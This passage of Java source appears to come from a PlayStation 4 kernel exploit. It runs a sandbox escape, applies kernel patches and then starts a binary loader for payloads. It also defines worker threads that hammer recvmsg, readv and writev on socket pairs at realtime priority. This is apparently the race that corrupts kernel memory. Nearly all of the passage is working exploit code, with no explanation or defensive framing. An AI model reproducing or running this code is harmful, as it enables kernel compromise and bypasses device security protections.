            cons.println("Escape sandbox failed");
            cleanup();
            return -7;
        }

        console.println("Patching system...");
        if (!applyKernelPatchesPS4()) {
            cons.println("Applying patches failed");
            cleanup();
            return -8;
        }

        cleanup();

        BinLoader.start();

        return 0;
    }

    static class IovThread extends Thread {
        private final WorkerState state;
        public IovThread(WorkerState state) {
            this.state = state;
        }
        public void run() {
            cpusetSetAffinity(4);
            Helper.setRealtimePriority(256);
            try {
                while (true) {
                    state.waitForWork();
                    recvmsg(iovSs0, msg, 0);
                    state.signalFinished();
                }
            } catch (InterruptedException e) {
            }
        }
    }

    static class UioThread extends Thread {
        private final WorkerState state;

        public UioThread(WorkerState state) {
        this.state = state;
        }
        public void run() {
            cpusetSetAffinity(4);
            Helper.setRealtimePriority(256);
            try {
                while (true) {
                    int command = state.waitForWork();
                    if (command == COMMAND_UIO_READ) {
                        writev(uioSs1, uioIovRead, UIO_IOV_NUM);
                    } else if (command == COMMAND_UIO_WRITE) {
                        readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
                    }
                    state.signalFinished();
                }
            } catch (InterruptedException e) {
            }
        }
    }

    static class WorkerState {
        private final int totalWorkers;

        private int workersStartedWork = 0;
        private int workersFinishedWork = 0;

        private int workCommand = -1;

        public WorkerState(int totalWorkers) {
            this.totalWorkers = totalWorkers;
        }

        public synchronized void signalWork(int command) {
            workersStartedWork = 0;
            workersFinishedWork = 0;
            workCommand = command;
            notifyAll();

            while (workersStartedWork < totalWorkers) {
                try {
                    wait();
                } catch (InterruptedException e) {
                    // Ignore.
                }
            }
        }

        public synchronized void waitForFinished() {
            while (workersFinishedWork < totalWorkers) {
                try {
                    wait();
                } catch (InterruptedException e) {
                    // Ignore.
                }
            }

            workCommand = -1;
        }

        public synchronized int waitForWork() throws InterruptedException {
            while (workCommand == -1 || workersFinishedWork != 0) {
                wait();
            }

            workersStartedWork++;
            if (workersStartedWork == totalWorkers) {
                notifyAll();
            }

            return workCommand;
        }

        public synchronized void signalFinished() {
            workersFinishedWork++;
            if (workersFinishedWork == totalWorkers) {
                notifyAll();
            }
        }
    }
}